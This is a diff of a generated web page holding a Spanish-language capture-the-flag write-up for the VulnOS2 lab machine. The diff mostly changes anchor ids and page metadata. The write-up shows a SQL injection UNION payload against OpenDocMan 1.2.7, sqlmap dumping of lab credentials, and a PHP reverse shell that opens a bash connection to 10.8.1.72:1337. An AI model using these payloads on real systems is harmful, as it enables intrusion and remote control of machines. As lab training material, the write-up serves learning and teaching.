@@ -1257,7 +1257,7 @@
     <meta property="twitter:description" content="Walkthrough :: Writeups de rooms y maquinas de TryHackMe, HackTheBox y CTFs, en español">
   
 
-<meta name="generator" content="Hugo 0.79.1" />
+<meta name="generator" content="Hugo 0.68.3" />
 <meta name="msapplication-TileColor" content="#1d1d1d">
 
 <meta name="theme-color" content="#1d1d1d">
@@ -1578,13 +1578,13 @@
   🏷️
   
 
-  <li><a href="https://sckull.github.io/tags/jabc-docs/" class="single__tag" title="jabc-docs">#jabc-docs</a></li>
-
   <li><a href="https://sckull.github.io/tags/sqli/" class="single__tag" title="sqli">#sqli</a></li>
 
   <li><a href="https://sckull.github.io/tags/sqlmap/" class="single__tag" title="sqlmap">#sqlmap</a></li>
 
   <li><a href="https://sckull.github.io/tags/kernel/" class="single__tag" title="kernel">#kernel</a></li>
+
+  <li><a href="https://sckull.github.io/tags/jabc-docs/" class="single__tag" title="jabc-docs">#jabc-docs</a></li>
 
 </ul>
     </div>
@@ -1635,7 +1635,7 @@
 </tbody>
 </table>
 <hr />
-<h2 id="masscan--nmap">MASSCAN &amp; NMAP</h2>
+<h2 id="masscan--nmap-">MASSCAN &amp; NMAP</h2>
 <p>Escaneo de puertos tcp/udp y servicios.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1757,12 +1757,12 @@ Service detection performed. Please report any incorrect results at https://nmap
 <span class="c1"># Nmap done at Wed Sep 18 23:50:59 2019 -- 1 IP address (1 host up) scanned in 34.28 seconds</span>
 </code></pre></td></tr></table>
 </div>
-</div><h2 id="whatweb">WHATWEB</h2>
+</div><h2 id="whatweb-">WHATWEB</h2>
 <p><img src="/images/posts/thm/vulnos2/Screenshot%20from%202019-09-18%2021.52.28.webp" alt="image" /></p>
-<h2 id="http">HTTP</h2>
+<h2 id="http-">HTTP</h2>
 <p>Pagina en el puerto 80.<br />
 <img src="/images/posts/thm/vulnos2/Screenshot%20from%202019-09-18%2021.54.57.webp" alt="image" /></p>
-<h2 id="dirbuster">DIRBUSTER</h2>
+<h2 id="dirbuster-">DIRBUSTER</h2>
 <p>Realizamos una busqueda de direcotrios, archivos html y txt con dirbuster.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1814,21 +1814,21 @@ by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span 
 <span class="o">===============================================================</span>
 </code></pre></td></tr></table>
 </div>
-</div><h3 id="http---jabc">HTTP - /jabc/</h3>
+</div><h3 id="http---jabc-">HTTP - /jabc/</h3>
 <p>Encontramos dentro de la pagina principla un enlace que nos redirige hacia otra pagina.<br />
 <img src="/images/posts/thm/vulnos2/Screenshot%20from%202019-09-18%2021.57.03.webp" alt="image" /></p>
 <p>Dentro de la pagina de Documentation a simple vista se ve que no hay contenido de esta pagina al analizar el codigo fuente de la pagina, observamos que existe texto oculto por razones de &ldquo;seguridad&rdquo;. En el texto nos indica que para visitar la documentacion de la pagina visitemos <code>/jabcd0cs/</code> e iniciemos sesion con <code>guest/guest</code>.</p>
 <p><img src="/images/posts/thm/vulnos2/Screenshot%20from%202019-09-18%2022.03.45.webp" alt="image" /></p>
-<h3 id="http---jabcd0cs">HTTP - /jabcd0cs/</h3>
+<h3 id="http---jabcd0cs-">HTTP - /jabcd0cs/</h3>
 <p>Visitamos la pagina y nos muestra un panel para iniciar sesion.</p>
 <p><img src="/images/posts/thm/vulnos2/Screenshot%20from%202019-09-18%2022.04.28.webp" alt="image" /></p>
 <p>Al iniciar sesion en la plataforma nos muestra un panel de control.<br />
 <img src="/images/posts/thm/vulnos2/Screenshot%20from%202019-09-18%2022.11.24.webp" alt="image" /></p>
 <p>Vemos que la plataforma es <code>OpenDocMan v1.2.7</code>.<br />
 <img src="/images/posts/thm/vulnos2/Screenshot%20from%202019-09-18%2022.12.37.webp" alt="image" /></p>
-<h4 id="opendocman-127---multiple-vulnerabilities">OpenDocMan 1.2.7 - Multiple Vulnerabilities</h4>
+<h4 id="opendocman-127---multiple-vulnerabilities-">OpenDocMan 1.2.7 - Multiple Vulnerabilities</h4>
 <p>Al investgar un poco mas acerca de esta plataforma encontramos que en especifico esta version de OpenDocMan tiene dos vulnerabilidades. La primera es una vulnerabilidad de Inyeccion de SQL y la segunda Improper Access Control.</p>
-<h4 id="sql-injection---opendocman-127">SQL Injection - OpenDocMan 1.2.7</h4>
+<h4 id="sql-injection---opendocman-127-">SQL Injection - OpenDocMan 1.2.7</h4>
 <p>Comprobamos si la vulnerabilidad de SQLi esta presente en la plataforma con la url y parametros para ver el usuario (<code>user()</code>).</p>
 <p><strong>Payload:</strong></p>
 <pre><code>ajax_udf.php?q=1&amp;add_value=odm_user%20UNION%20SELECT%201,user%28%29,3,4,5,6,7,8,9
@@ -1836,7 +1836,7 @@ by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span 
 <p>Vemos que la vulnerabilidad esta presente ya que nos muestra el usuario. Para obtener los datos de la base de datos, utilizamos burpsuite para interceptar el trafico, guardamos el trafico del payload de SQLi de esta plataforma en un archivo response.req y utilizamos sqlmap con este archivo.</p>
 <p><strong>response.req</strong><br />
 <img src="/images/posts/thm/vulnos2/Screenshot%20from%202019-09-18%2022.35.30.webp" alt="image" /></p>
-<h3 id="sqlmap">SQLMAP</h3>
+<h3 id="sqlmap-">SQLMAP</h3>
 <p><strong>Comando:</strong></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1881,7 +1881,7 @@ Table: odm_user
 <p><strong>Credenciales:</strong></p>
 <pre><code>webmin:webmin1980
 guest:guest
-</code></pre><h2 id="shell---php">SHELL - PHP </h2>
+</code></pre><h2 id="shell---php--">SHELL - PHP </h2>
 <p>Ya que tenemos las credenciales de administrador regresamos a la pagina principal <code>/jabc/</code> y visitamos el panel de inicio de sesion y utilizamos las credenciales (<code>webmin:webmin1980</code>), ya que tenemos control de las paginas habilitamos el modulo de PHP (PHP Filter), luego de esto agregamos codigo php con nuestra shell inversa a la pagina de &lsquo;Documentation&rsquo;.</p>
 <p><strong>PHP Modulo:</strong><br />
 <img src="/images/posts/thm/vulnos2/Screenshot%20from%202019-09-18%2023.45.05.webp" alt="image" /></p>
@@ -1893,16 +1893,16 @@ guest:guest
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<pre class="chroma"><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
 <span class="nx">exec</span><span class="p">(</span><span class="s2">&#34;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.8.1.72/1337 0&gt;&amp;1&#39;&#34;</span><span class="p">);</span>
-<span class="cp">?&gt;</span><span class="err">
-</span></code></pre></td></tr></table>
+<span class="cp">?&gt;</span>
+</code></pre></td></tr></table>
 </div>
 </div><p><img src="/images/posts/thm/vulnos2/Screenshot%20from%202019-09-18%2023.47.14.webp" alt="image" /></p>
 <p><strong>Netcat:</strong></p>
 <p>Ponemos a la escucha nuestra maquina con netcat y el puerto 1337.<br />
 <img src="/images/posts/thm/vulnos2/Screenshot%20from%202019-09-18%2023.49.34.webp" alt="image" /></p>
-<h2 id="privilege-escalation">PRIVILEGE ESCALATION</h2>
+<h2 id="privilege-escalation-">PRIVILEGE ESCALATION</h2>
 <p>Verificamos la version del kernel de la maquina y verificamos si existe un exploit para esa version con searchsploit.</p>
 <p><strong>Version de Kernel:</strong><br />
 <img src="/images/posts/thm/vulnos2/Screenshot%20from%202019-09-18%2023.55.27.webp" alt="image" /></p>
@@ -3253,7 +3253,7 @@ document.addEventListener('DOMContentLoaded', function () {
             <p class="caption">
                 
                     
-                        ©2020, All Rights Reserved
+                        ©2021, All Rights Reserved
                     
                 
             </p>
@@ -3301,18 +3301,18 @@ document.addEventListener('DOMContentLoaded', function () {
             <li><a href="#informacion-de-la-maquina">Informacion de la Maquina</a></li>
           </ul>
         </li>
-        <li><a href="#masscan--nmap">MASSCAN &amp; NMAP</a></li>
-        <li><a href="#whatweb">WHATWEB</a></li>
-        <li><a href="#http">HTTP</a></li>
-        <li><a href="#dirbuster">DIRBUSTER</a>
+        <li><a href="#masscan--nmap-">MASSCAN &amp; NMAP</a></li>
+        <li><a href="#whatweb-">WHATWEB</a></li>
+        <li><a href="#http-">HTTP</a></li>
+        <li><a href="#dirbuster-">DIRBUSTER</a>
           <ul>
-            <li><a href="#http---jabc">HTTP - /jabc/</a></li>
-            <li><a href="#http---jabcd0cs">HTTP - /jabcd0cs/</a></li>
-            <li><a href="#sqlmap">SQLMAP</a></li>
+            <li><a href="#http---jabc-">HTTP - /jabc/</a></li>
+            <li><a href="#http---jabcd0cs-">HTTP - /jabcd0cs/</a></li>
+            <li><a href="#sqlmap-">SQLMAP</a></li>
           </ul>
         </li>
-        <li><a href="#shell---php">SHELL - PHP </a></li>
-        <li><a href="#privilege-escalation">PRIVILEGE ESCALATION</a></li>
+        <li><a href="#shell---php--">SHELL - PHP </a></li>
+        <li><a href="#privilege-escalation-">PRIVILEGE ESCALATION</a></li>
       </ul>
     </li>
   </ul>
